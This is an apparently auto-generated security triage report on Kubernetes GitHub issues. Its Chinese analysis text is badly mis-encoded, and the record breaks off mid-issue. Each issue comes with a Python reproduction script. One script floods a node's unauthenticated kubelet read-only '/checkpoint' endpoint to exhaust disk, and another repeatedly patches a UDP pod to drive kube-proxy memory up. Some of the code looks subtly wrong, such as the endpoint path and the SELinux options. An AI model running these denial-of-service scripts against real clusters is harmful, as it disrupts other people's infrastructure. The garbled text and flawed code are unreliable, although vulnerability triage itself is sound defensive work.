# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

# ğŸš¨ å­˜åœ¨é«˜é£é™©çš„ Issues (2 ä¸ª)

## Issue #130016 CVE-2025-0426: Node Denial of Service via kubelet Checkpoint API

- Issue é“¾æ¥ï¼š[#130016](https://github.com/kubernetes/kubernetes/issues/130016)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk. 

#### Am I vulnerable?

All clusters running an affected version listed below with the kubelet read-only HTTP port enabled and using a container runtime that supports the container checkpointing feature, such as CRI-O v1.25.0+ (with `enable_criu_support` set to true) or containerd v2.0+ with `criu` installed, are affected.

##### Affected Versions

- kubelet v1.32.0 to v1.32.1
- kubelet v1.31.0 to v1.31.5
- kubelet v1.30.0 to v1.30.9

#### How do I mitigate this vulnerability?

This issue can be mitigated by setting the `ContainerCheckpoint` feature gate to `false` in your kubelet configuration, disabling the kubelet read-only port, and limiting access to the kubelet API, or upgrading to a fixed version listed below, which enforces authentication for the kubelet Checkpoint API.

##### Fixed Versions

- kubelet master - fixed by #129739
- kubelet v1.32.2 - fixed by #130010
- kubelet v1.31.6 - fixed by #130011
- kubelet v1.30.10 - fixed by #130012
- kubelet v1.29.14 - fixed by #130014
  - Note: Container checkpoint support was an off by default Alpha feature in v1.25-v1.29

#### Detection

A large number of requests to the kubelet read-only HTTP server's `/checkpoint` endpoint, or a large number of checkpoints stored (by default) under `/var/lib/kubelet/checkpoints` on a Node may indicate an attempted Denial of Service attack using this bug.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported and fixed by Tim Allclair @tallclair from Google.

The issue was coordinated by: 

Tim Allclair @tallclair
Sascha Grunert saschagrunert@
Craig Ingram @cji
Jordan Liggitt liggitt@

/triage accepted
/lifecycle frozen
/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig node
/area kubelet

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©  
ï¼ˆä¾æ® CVSS 3.1 çŸ­è¯„ï¼š[CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H]ï¼Œæ”»å‡»è€…æœ¬åœ°ç½‘ç»œå†…å³å¯å‘èµ· DoS æ”»å‡»ï¼Œä¸¥é‡å½±å“èŠ‚ç‚¹çš„å¯ç”¨æ€§ï¼‰

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„æ˜¯ Kubernetes ä¸­ kubelet Checkpoint API å­˜åœ¨ä¸€ä¸ªæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥å‘æœªè®¤è¯çš„ kubelet åªè¯» HTTP ç«¯ç‚¹å‘é€å¤§é‡å®¹å™¨ checkpoint è¯·æ±‚ï¼Œä»è€Œåœ¨ Node ä¸Šå¡«æ»¡ç£ç›˜å¯¼è‡´æœåŠ¡ä¸å¯ç”¨ï¼ˆDoSï¼‰ã€‚è¯¥é—®é¢˜åˆ©ç”¨äº† kubelet åœ¨å¯ç”¨äº† checkpoint ç‰¹æ€§ä¸”æœªä½œèº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ¥å—å¤§é‡è¯·æ±‚çš„ç¼ºé™·ï¼Œä¾èµ–çš„æ¡ä»¶æ˜¯ä½¿ç”¨äº†æ”¯æŒ checkpoint çš„ container runtimeï¼ˆä¾‹å¦‚ CRI-O æˆ– containerdï¼‰ï¼Œè€Œä¸” kubelet çš„åªè¯»ç«¯å£å¼€å¯ã€‚é—®é¢˜å½±å“èŒƒå›´è¾ƒå¤§ï¼Œä¸”æ— éœ€æ”»å‡»è€…å…·æœ‰ä»»ä½•æƒé™å³å¯è§¦å‘æ”»å‡»ï¼Œå› æ­¤é£é™©è¾ƒé«˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import requests
from kubernetes import client, config

# è®¾ç½®å…¨å±€å˜é‡ï¼Œæ§åˆ¶æµ‹è¯•æ—¶é•¿ï¼ˆå•ä½ç§’ï¼‰
TEST_DURATION = 120  # è¶…æ—¶2åˆ†é’Ÿ
REQUEST_TIMEOUT = 5  # å•ä¸ªè¯·æ±‚è¶…æ—¶ï¼ˆç§’ï¼‰
NUM_THREADS = 4      # çº¿ç¨‹æ•°é‡ï¼Œå¯æ ¹æ®éœ€è¦è°ƒæ•´

# ç”¨äºçº¿ç¨‹é—´ç»Ÿè®¡è¯·æ±‚æ•°
request_counter = 0
counter_lock = threading.Lock()

def load_nodes():
    """
    ä½¿ç”¨ Kubernetes Python client åŠ è½½ kubeconfig å¹¶è·å–é›†ç¾¤ä¸­çš„ NodeInternalIPã€‚
    è¿™é‡Œå‡è®¾ kubeconfig ä½äºé»˜è®¤ä½ç½®ï¼ˆå¦‚ ~/.kube/configï¼‰ã€‚
    """
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥: ", e)
        return []
    v1 = client.CoreV1Api()
    try:
        nodes = v1.list_node().items
    except Exception as e:
        print("è·å–èŠ‚ç‚¹åˆ—è¡¨å¤±è´¥: ", e)
        return []
    node_ips = []
    for node in nodes:
        for addr in node.status.addresses:
            if addr.type == "InternalIP":
                node_ips.append(addr.address)
                break
    return node_ips

def send_requests(target_url, stop_time):
    """
    ä¸æ–­å‘ç›®æ ‡ URL å‘é€ GET è¯·æ±‚ç›´åˆ°è¾¾åˆ°åœæ­¢æ—¶é—´
    """
    global request_counter
    while time.time() < stop_time:
        try:
            # å‘é€ GET è¯·æ±‚åˆ° /checkpoint æ¥å£
            r = requests.get(target_url, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                with counter_lock:
                    request_counter += 1
            else:
                # è¿”å›é200ä¹Ÿè®°å½•è¯·æ±‚
                with counter_lock:
                    request_counter += 1
        except Exception as e:
            # è¯·æ±‚è¶…æ—¶æˆ–å¤±è´¥æ—¶ä¹Ÿç»§ç»­å°è¯•
            pass

def main():
    nodes = load_nodes()
    if not nodes:
        print("æœªèƒ½è·å–åˆ° Kubernetes èŠ‚ç‚¹ä¿¡æ¯ï¼Œè¯·ç¡®ä¿ kubeconfig æ­£ç¡®ä¸”é›†ç¾¤å¯è®¿é—®ã€‚")
        return

    # é’ˆå¯¹æ¯ä¸ªèŠ‚ç‚¹æ„é€  kubelet åªè¯» HTTP ç«¯å£åœ°å€ï¼ˆé»˜è®¤ç«¯å£ 10255ï¼‰
    # è¿™é‡Œå‡è®¾å—å½±å“çš„èŠ‚ç‚¹å¼€å¯äº†åªè¯»ç«¯å£
    endpoints = []
    for ip in nodes:
        endpoint_url = f"http://{ip}:10255/checkpoint"
        endpoints.append(endpoint_url)
    print("æ£€æµ‹åˆ°ä»¥ä¸‹ kubelet Checkpoint API ç»ˆç«¯åœ°å€:")
    for url in endpoints:
        print("  ", url)

    # é€‰æ‹©ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºå¤ç°ç›®æ ‡è¿›è¡Œ DoS æ”»å‡»æµ‹è¯•
    target = endpoints[0]
    print(f"å¼€å§‹é’ˆå¯¹ {target} æ¨¡æ‹Ÿå¤§é‡è¯·æ±‚ä»¥å¤ç° DoS æ¼æ´ï¼Œæµ‹è¯•æ—¶é•¿ {TEST_DURATION} ç§’...")

    stop_time = time.time() + TEST_DURATION
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=send_requests, args=(target, stop_time))
        threads.append(t)
        t.start()

    # ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ
    for t in threads:
        t.join(timeout=TEST_DURATION + 10)

    print(f"æµ‹è¯•ç»“æŸï¼Œå…±å°è¯•å‘é€è¯·æ±‚ {request_counter} æ¬¡ã€‚")
    print("è¯·æ£€æŸ¥ç›®æ ‡èŠ‚ç‚¹çš„ç£ç›˜ä½¿ç”¨æƒ…å†µï¼Œçœ‹æ˜¯å¦ç”±äºå¤§é‡ checkpoint è¯·æ±‚å¯¼è‡´ç£ç›˜ç©ºé—´å¼‚å¸¸å¢é•¿ã€‚")

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


---


## Issue #129982 Excessive conntrack cleanup causes high memory (12GB) and CPU usage when any Pod with a UDP port changes

- Issue é“¾æ¥ï¼š[#129982](https://github.com/kubernetes/kubernetes/issues/129982)

### Issue å†…å®¹

#### What happened?

We are encountering a severe performance issue in kube-proxy (v1.32) when any Pod with a UDP port is updated (e.g., CoreDNS). In the new kube-proxy implementation, changes to Services or Pods that expose UDP ports trigger a full conntrack cleanup. This cleanup process iterates over the entire conntrack table, leading to extremely high resource consumptionâ€”sometimes up to 12 GB of memory and 1.5 CPU cores per kube-proxy instance.

In a simple test, we observed 2,780 instances of the log message "Adding conntrack filter for cleanup", which caused an OOM when kube-proxy was limited to 256 MB of memory. Without that limit, kube-proxy memory usage spiked to 12 GB. On nodes with large conntrack tables, kube-proxy effectively becomes stuck, consuming all available memory each time there is a UDP endpoint change.

This issue appears to be systemic; every change in a Pod with a UDP port triggers all kube-proxy instances to perform the extensive cleanup. Currently, there is no option to disable or throttle this behavior, which disrupts cluster stability and can lead to service degradation or outages. We request that the cleanup logic be revised to target only the relevant conntrack entries or that a mechanism be provided to disable or limit this aggressive cleanup behavior.


https://github.com/kubernetes/kubernetes/pull/127318
https://github.com/kubernetes/kubernetes/issues/126130

#### What did you expect to happen?

We expected kube-proxy to handle conntrack cleanup in a more efficient and targeted way. Even if it needs to scan a significant portion of the conntrack table, it should do so without causing a spike to 12 GB of memory usage. Ideally, it would either:

- Limit its cleanup to entries relevant to the specific changed UDP endpoint.
- Provide a way to configure or disable this aggressive cleanup process so it does not risk out-of-memory (OOM) events or excessively high CPU usage.

#### How can we reproduce it (as minimally and precisely as possible)?

- Deploy multiple Pods that generate a high volume of DNS requests, for example:
- A simple Golang application making repeated DNS lookups without any caching mechanism.
- Observe kube-proxy resource usage (memory and CPU) on that node.
- Delete or update the coredns Pod (which also uses UDP DNS).
- Watch the logs and resource usage of kube-proxy closely, noting the surge in memory (potentially up to 12 GB) and CPU usage as it performs the conntrack cleanup.

#### Anything else we need to know?

![Image](https://github.com/user-attachments/assets/f75f0bc0-e394-45fa-b323-2f6fc0570386)

<img width="1708" alt="Image" src="https://github.com/user-attachments/assets/a4ff03e2-156c-4b60-bf87-7caf53859e51" />

<img width="1679" alt="Image" src="https://github.com/user-attachments/assets/81b4bea7-5cf6-498e-9cd4-ec807f267912" />

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.32.0-eks-5ca49cb
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux: Amazon Linux 2
5.10.230-223.885.amzn2.aarch64

```

</details>


#### Install tools

<details>
EKS
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://1.7.23
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
kube-proxy:v1.32.0-minimal-eksbuild.2
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
æ ¹æ®æè¿°ï¼Œè¯¥é—®é¢˜å±äºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é£é™©ï¼Œå¹¶ä¸”æ”»å‡»è€…ä¸ä¸€å®šéœ€è¦é«˜æƒé™å³å¯æ‰§è¡Œï¼ˆåœ¨å¤šç§Ÿæˆ·åœºæ™¯ä¸‹æ™®é€šç”¨æˆ·å¯èƒ½æœ‰åˆ›å»ºæ›´æ–° Pod çš„æƒé™ï¼‰ï¼Œå› æ­¤ä½¿ç”¨ CVSS 3.1 æ ‡å‡†æ‰“åˆ†åå¯è¯„ä¸ºé«˜é£é™©ã€‚

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„æ˜¯ kube-proxy åœ¨æ£€æµ‹åˆ°ä»»ä½•å¸¦ UDP ç«¯å£çš„ Pod å‘ç”Ÿå˜æ›´æ—¶ï¼Œä¼šè§¦å‘å…¨å±€çš„ conntrack æ¸…ç†ï¼Œå¯¼è‡´æ¸…ç†è¿‡ç¨‹éå†æ•´ä¸ª conntrack è¡¨ï¼Œä»è€Œå¼•å‘æé«˜çš„å†…å­˜å’Œ CPU å ç”¨ï¼Œä¸¥é‡æ—¶ç”šè‡³ä¼šä½¿ kube-proxy å‘ç”Ÿå†…å­˜æº¢å‡ºå’ŒèŠ‚ç‚¹å®•æœºã€‚è¯¥é—®é¢˜æœ¬èº«ä¸æ¶‰åŠå¯†ç ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–ä¸å½“é…ç½®ï¼Œä½†å…¶å½±å“åœ¨äºå¯èƒ½è¢«æ¶æ„ç”¨æˆ·åˆ©ç”¨äº§ç”Ÿæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„æ•ˆæœã€‚ç‰¹åˆ«æ˜¯åœ¨å¤šç§Ÿæˆ·é›†ç¾¤ä¸­ï¼Œåªéœ€å…·å¤‡åˆ›å»ºæˆ–æ›´æ–° Pod çš„æƒé™ï¼ˆé€šå¸¸æ™®é€šç”¨æˆ·å‡æœ‰æƒé™åˆ›å»ºæˆ–æ›´æ–°è‡ªå·±çš„ Podï¼‰å³å¯å¤ç°è¯¥è¡Œä¸ºï¼Œä»è€Œå¯¹é›†ç¾¤ç¨³å®šæ€§é€ æˆå½±å“ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import traceback
from datetime import datetime, timezone

from kubernetes import client, config
from kubernetes.client.rest import ApiException

# è®¾ç½®æ•´ä¸ªè„šæœ¬çš„æ‰§è¡Œæœ€å¤§æ—¶é—´ä¸º2åˆ†é’Ÿ
EXECUTION_TIMEOUT = 120  # ç§’
NAMESPACE = "poc-dos-test"
POD_NAME = "udp-pod-dos"

def create_namespace(v1):
    ns = client.V1Namespace(
        metadata=client.V1ObjectMeta(name=NAMESPACE)
    )
    try:
        v1.create_namespace(ns)
        print(f"Namespace {NAMESPACE} åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"Namespace {NAMESPACE} å·²å­˜åœ¨")
        else:
            print("åˆ›å»º Namespace å¤±è´¥ï¼š", e)
            raise

def create_udp_pod(v1):
    # åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ UDP ç«¯å£å®šä¹‰çš„ Podï¼Œä½¿ç”¨ busybox ä½œä¸ºç¤ºä¾‹é•œåƒï¼ŒæŒç»­ sleep 3600 ç§’
    container = client.V1Container(
        name="udp-container",
        image="busybox",
        command=["sh", "-c", "sleep 3600"],
        ports=[client.V1ContainerPort(container_port=53, protocol="UDP")]
    )
    pod_spec = client.V1PodSpec(containers=[container])
    pod_metadata = client.V1ObjectMeta(
        name=POD_NAME,
        labels={"app": "udp-test"}
    )
    pod = client.V1Pod(
        metadata=pod_metadata,
        spec=pod_spec
    )
    try:
        v1.create_namespaced_pod(namespace=NAMESPACE, body=pod)
        print(f"Pod {POD_NAME} åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        print("åˆ›å»º Pod å¤±è´¥ï¼š", e)
        raise

def wait_for_pod_running(v1, timeout=60):
    print("ç­‰å¾… Pod è¿›å…¥ Running çŠ¶æ€...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            pod = v1.read_namespaced_pod(name=POD_NAME, namespace=NAMESPACE)
            if pod.status.phase == "Running":
                print("Pod å·²å¤„äº Running çŠ¶æ€")
                return True
        except ApiException:
            pass
        time.sleep(2)
    raise TimeoutError("Pod æœªåœ¨è§„å®šæ—¶é—´å†…è¿›å…¥ Running çŠ¶æ€")

def patch_pod_annotation(v1):
    now_str = datetime.now(timezone.utc).isoformat()
    patch_body = {
        "metadata": {
            "annotations": {
                "updatedAt": now_str
            }
        }
    }
    try:
        v1.patch_namespaced_pod(name=POD_NAME, namespace=NAMESPACE, body=patch_body)
        print(f"Pod è¿›è¡Œäº†æ›´æ–°ï¼ŒupdatedAt: {now_str}")
    except ApiException as e:
        print("æ›´æ–° Pod å¤±è´¥ï¼š", e)

def delete_namespace(v1):
    try:
        v1.delete_namespace(name=NAMESPACE)
        print(f"Namespace {NAMESPACE} åˆ é™¤ä¸­...")
    except ApiException as e:
        print("åˆ é™¤ Namespace å¤±è´¥ï¼š", e)

def main():
    try:
        # åŠ è½½é»˜è®¤çš„ kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥ï¼Œè¯·ç¡®ä¿æ–‡ä»¶åœ¨é»˜è®¤ä½ç½®", e)
        return

    v1 = client.CoreV1Api()

    try:
        create_namespace(v1)
        create_udp_pod(v1)
        wait_for_pod_running(v1)
    except Exception:
        traceback.print_exc()
        return

    # å¼€å§‹è¿›è¡Œ Pod æ›´æ–°æ“ä½œï¼Œæ¯æ¬¡æ›´æ–°ä¼šæ”¹å˜ Pod çš„ annotationsï¼Œæ¨¡æ‹ŸUDP Podæ›´æ–°äº‹ä»¶ï¼Œä»è€Œè§¦å‘ kube-proxy çš„å…¨å±€ conntrack cleanup
    start_time = time.time()
    try:
        while time.time() - start_time < EXECUTION_TIMEOUT:
            patch_pod_annotation(v1)
            # æ¯ 5 ç§’è¿›è¡Œä¸€æ¬¡æ›´æ–°ï¼Œé€‚å½“è°ƒèŠ‚æ›´æ–°é¢‘ç‡
            time.sleep(5)
    except Exception:
        traceback.print_exc()
    finally:
        try:
            delete_namespace(v1)
        except Exception:
            traceback.print_exc()
        print("å¤ç°è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬é¦–å…ˆåŠ è½½é»˜è®¤ä½ç½®çš„ kubeconfigï¼Œé€šè¿‡ python çš„ kubernetes å®¢æˆ·ç«¯æ“ä½œé›†ç¾¤ã€‚
2. åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼ˆpoc-dos-testï¼‰ï¼Œä»¥é˜²æ­¢å¯¹ç°æœ‰å‘½åç©ºé—´é€ æˆå¹²æ‰°ã€‚
3. åœ¨è¯¥å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªåä¸º udp-pod-dos çš„ Podï¼Œæ­¤ Pod ä½¿ç”¨ busybox é•œåƒå¹¶æŒ‡å®šäº† UDP ç«¯å£ï¼ˆä¾‹å¦‚ 53 ç«¯å£ï¼‰ã€‚
4. è„šæœ¬ç­‰å¾… Pod è¿›å…¥ Running çŠ¶æ€åï¼Œè¿›å…¥ä¸»å¾ªç¯ã€‚åœ¨ä¸»å¾ªç¯ä¸­ï¼Œæ¯éš” 5 ç§’é€šè¿‡ patch æ“ä½œæ›´æ–° Pod çš„ annotationï¼Œä»è€Œæ¨¡æ‹Ÿ Pod æ›´æ–°äº‹ä»¶ã€‚æ ¹æ® issue çš„æè¿°ï¼Œæ¯æ¬¡æ­¤äº‹ä»¶éƒ½ä¼šè§¦å‘ kube-proxy å¯¹æ•´ä¸ª conntrack è¡¨è¿›è¡Œæ¸…ç†ï¼Œä»è€Œå¯èƒ½å¸¦æ¥é«˜å†…å­˜å’Œ CPU æ¶ˆè€—ã€‚
5. æ•´ä¸ªæ“ä½œåœ¨ 2 åˆ†é’Ÿå†…æ‰§è¡Œå®Œæ¯•ï¼Œé¿å…è„šæœ¬é™·å…¥æ­»å¾ªç¯ã€‚æœ€åæ¸…ç†åˆ›å»ºçš„å‘½åç©ºé—´ï¼Œç¡®ä¿ä¸ä¼šå¯¹é›†ç¾¤ç•™ä¸‹æ®‹ç•™èµ„æºã€‚
6. æ­¤å¤ç°è„šæœ¬ä»…ç”¨äºç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ï¼ŒåŠ¡å¿…åœ¨éç”Ÿäº§ç¯å¢ƒä¸­éªŒè¯ï¼

---


# âš ï¸ å­˜åœ¨ä½é£é™©çš„ Issues (3 ä¸ª)

## Issue #130036 SELinux controller does not work when KCM runs in a container

- Issue é“¾æ¥ï¼š[#130036](https://github.com/kubernetes/kubernetes/issues/130036)

### Issue å†…å®¹

#### What happened?

When KCM runs in a container (such as in a kops cluster), the SELinuxWarning controller does not do anything, because it thinks that SELinux is disabled - it reads /etc/selinux and /sys/fs/selinux to detect so here:
https://github.com/kubernetes/kubernetes/blob/20b12ad5c389ff74792988bf1e0c10fe2820d9a1/pkg/volume/util/selinux.go#L109

As result, it does not emit useful warnings.

#### What did you expect to happen?

The controller emits events, regardless if it can access /etc or /sys on the host. The controller must be explicitly enabled, so it can expect that someone who enabled it also enabled SELinux on nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

Run KCM with `--controllers=*,selinux-warning-controller --feature-gates=SELinuxChangePolicy=true,SELinuxMount=true` and create 2 pods that use the same volume, but each Pod has different `seLinuxOptions`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
Today's master
```console
v1.33.0-alpha.0.569+834719d46dabe1-dirty
```
</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>
```console
PRETTY_NAME="Fedora Linux 41 (Cloud Edition)"
```
</details>


#### Install tools

<details>
kops
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©  
è¯´æ˜ï¼šè¯¥é—®é¢˜æœ¬èº«ä¸ç›´æ¥å¯¼è‡´è¿œç¨‹æ”»å‡»ã€æƒé™æå‡æˆ–å‘½ä»¤æ‰§è¡Œç­‰ä¸¥é‡å®‰å…¨æ¼æ´ï¼Œè€Œåªæ˜¯å‰Šå¼±äº†å¯¹ SELinux å¼‚å¸¸çš„æ£€æµ‹å’Œå‘Šè­¦åŠŸèƒ½ï¼Œä»è€Œå¯èƒ½åœ¨éƒ¨ç½²ä¸­åŸ‹ä¸‹é…ç½®é£é™©ã€‚æ ¹æ® CVSS 3.1 è¯„åˆ†æ ‡å‡†ï¼Œè¿™ç±»é—®é¢˜æš‚æ—¶å¯è¯„ä¸ºä½é£é™©ã€‚

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯åœ¨å®¹å™¨ä¸­è¿è¡Œçš„ Kubernetes Controller Managerï¼ˆKCMï¼‰ä¸­çš„ SELinuxWarning controller æœªèƒ½æ­£å¸¸å·¥ä½œçš„é—®é¢˜ã€‚ä¸»è¦åŸå› åœ¨äº controller é€šè¿‡è¯»å–å®¹å™¨å†…çš„ /etc/selinux å’Œ /sys/fs/selinux æ–‡ä»¶æ¥åˆ¤æ–­ SELinux çŠ¶æ€ï¼Œå½“ KCM ä»¥å®¹å™¨æ–¹å¼è¿è¡Œæ—¶ï¼Œè¿™ä¸¤ä¸ªè·¯å¾„å¹¶ä¸èƒ½åæ˜ ä¸»æœºçš„ SELinux çŠ¶æ€ï¼Œå¯¼è‡´é”™è¯¯åœ°è®¤ä¸º SELinux è¢«ç¦ç”¨ï¼Œä»è€Œä¸å‘å‡ºé¢„æœŸçš„è­¦å‘Šäº‹ä»¶ã€‚æ­¤é—®é¢˜å¯èƒ½å¯¼è‡´ç®¡ç†å‘˜å¿½ç•¥å®é™…èŠ‚ç‚¹ä¸Š SELinux æœªå¼€å¯æˆ–é…ç½®é”™è¯¯çš„æƒ…å†µï¼Œä»è€Œä½¿å¾—å®‰å…¨åŠ å›ºçŠ¶æ€ä¸æ˜ï¼Œè™½ç„¶æœ¬è´¨ä¸Šåªæ˜¯å‘Šè­¦åŠŸèƒ½å¤±æ•ˆï¼Œä½†å¯èƒ½ä¼šé—´æ¥é™ä½ç›‘æ§å’Œå®¡è®¡çš„å®‰å…¨èƒ½åŠ›ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
import time
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def create_pvc(api, namespace, pvc_name):
    pvc = client.V1PersistentVolumeClaim(
        metadata=client.V1ObjectMeta(name=pvc_name),
        spec=client.V1PersistentVolumeClaimSpec(
            access_modes=["ReadWriteOnce"],
            resources=client.V1ResourceRequirements(
                requests={"storage": "1Gi"}
            )
        )
    )
    try:
        api.create_namespaced_persistent_volume_claim(namespace=namespace, body=pvc)
        print(f"PVC {pvc_name} åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"PVC {pvc_name} å·²å­˜åœ¨ï¼Œç»§ç»­")
        else:
            print("åˆ›å»ºPVCå¤±è´¥: %s\n" % e)
            raise

def create_pod(api, namespace, pod_name, pvc_name, se_linux_options):
    # æ„é€ å®¹å™¨SecurityContext
    container_security_context = client.V1SecurityContext(
        se_linux_options=client.V1SELinuxOptions(
            user=se_linux_options.get("user"),
            role=se_linux_options.get("role"),
            type=se_linux_options.get("type"),
            level=se_linux_options.get("level")
        )
    )
    # æ„é€ å®¹å™¨
    container = client.V1Container(
        name="busybox",
        image="busybox",
        command=["sleep", "3600"],
        security_context=container_security_context,
        volume_mounts=[client.V1VolumeMount(
            mount_path="/mnt/data",
            name="shared-data"
        )]
    )
    pod_spec = client.V1PodSpec(
        containers=[container],
        volumes=[client.V1Volume(
            name="shared-data",
            persistent_volume_claim=client.V1PersistentVolumeClaimVolumeSource(
                claim_name=pvc_name
            )
        )],
        restart_policy="Never"
    )
    pod = client.V1Pod(
        metadata=client.V1ObjectMeta(name=pod_name),
        spec=pod_spec
    )
    try:
        api.create_namespaced_pod(namespace=namespace, body=pod)
        print(f"Pod {pod_name} åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        print("åˆ›å»ºPodå¤±è´¥: %s\n" % e)
        raise

def delete_resource(api, namespace, name, kind="pod"):
    try:
        if kind == "pod":
            api.delete_namespaced_pod(name, namespace, client.V1DeleteOptions())
            print(f"Pod {name} åˆ é™¤æˆåŠŸ")
        elif kind == "pvc":
            api.delete_namespaced_persistent_volume_claim(name, namespace, client.V1DeleteOptions())
            print(f"PVC {name} åˆ é™¤æˆåŠŸ")
    except ApiException as e:
        print(f"åˆ é™¤ {kind} {name} å¤±è´¥: {e}")

def run_reproduce():
    # è½½å…¥é»˜è®¤çš„kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½kubeconfigå¤±è´¥: ", e)
        return

    core_v1_api = client.CoreV1Api()
    namespace = "default"
    pvc_name = "selinux-test-pvc"
    pod1_name = "selinux-test-pod-1"
    pod2_name = "selinux-test-pod-2"

    # åˆ›å»ºPVC
    create_pvc(core_v1_api, namespace, pvc_name)

    # å®šä¹‰ä¸¤ä¸ªPodä¸åŒçš„seLinuxOptionså‚æ•°
    se_linux_options_1 = {"user": "system_u", "role": "system_r", "type": "spc_t", "level": "s0"}
    se_linux_options_2 = {"user": "unconfined_u", "role": "object_r", "type": "s0:c123,c456", "level": "s0"}

    # åˆ†åˆ«åˆ›å»ºä¸¤ä¸ªPodï¼Œè¿™ä¸¤ä¸ªPodæŒ‚è½½åŒä¸€ä¸ªPVCä½†seLinuxOptionsä¸ä¸€è‡´
    create_pod(core_v1_api, namespace, pod1_name, pvc_name, se_linux_options_1)
    create_pod(core_v1_api, namespace, pod2_name, pvc_name, se_linux_options_2)

    # ç­‰å¾…ä¸€æ®µæ—¶é—´ä»¥ä¾¿è§‚å¯ŸPodçŠ¶æ€å’Œäº‹ä»¶ï¼ˆé»˜è®¤ç­‰å¾…30ç§’ï¼‰
    timeout = 60  # è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º60ç§’ï¼Œç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…ç»“æŸ
    print("ç­‰å¾…ä¸­ï¼Œè¯·åœ¨é›†ç¾¤ä¸­è§‚å¯ŸKCMæ˜¯å¦äº§ç”Ÿç›¸å…³çš„SELinuxå‘Šè­¦äº‹ä»¶...")
    time.sleep(timeout)

    # æ¸…ç†èµ„æº
    delete_resource(core_v1_api, namespace, pod1_name, kind="pod")
    delete_resource(core_v1_api, namespace, pod2_name, kind="pod")
    delete_resource(core_v1_api, namespace, pvc_name, kind="pvc")
    print("å¤ç°æµ‹è¯•ç»“æŸï¼Œèµ„æºå·²æ¸…ç†ã€‚")

def timeout_exit():
    # è¶…æ—¶é€€å‡ºæœºåˆ¶ï¼Œç¡®ä¿è„šæœ¬ä¸ä¼šè¿è¡Œè¶…è¿‡120ç§’
    time.sleep(120)
    print("æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡ºç¨‹åº")
    import sys
    sys.exit(1)

def main():
    # å¯åŠ¨è¶…æ—¶çº¿ç¨‹ï¼Œç¡®ä¿åœ¨2åˆ†é’Ÿå†…é€€å‡º
    t = threading.Thread(target=timeout_exit)
    t.daemon = True
    t.start()
    run_reproduce()

main()
```


---


## Issue #129979 CRD conversion webhooks should not be called for unused apiVersions

- Issue é“¾æ¥ï¼š[#129979](https://github.com/kubernetes/kubernetes/issues/129979)

### Issue å†…å®¹

#### What happened?

We have CRDs with multiple apiVersions. Even if the old (non-storage) apiVersions are not used at all we regularly receive conversion requests for them.

We roughly get 1 conversion request for each non-storage apiVersion per kube-apiserver instance for every CR create/update (actually a little bit less than that, but not sure why).

So if we have a CRD with 5 old apiVersions and a cluster with 3 kube-apiservers

=> we get roughly 15 conversion requests for every create/update on a CR (it's slightly less than that - not sure why though)



#### What did you expect to happen?

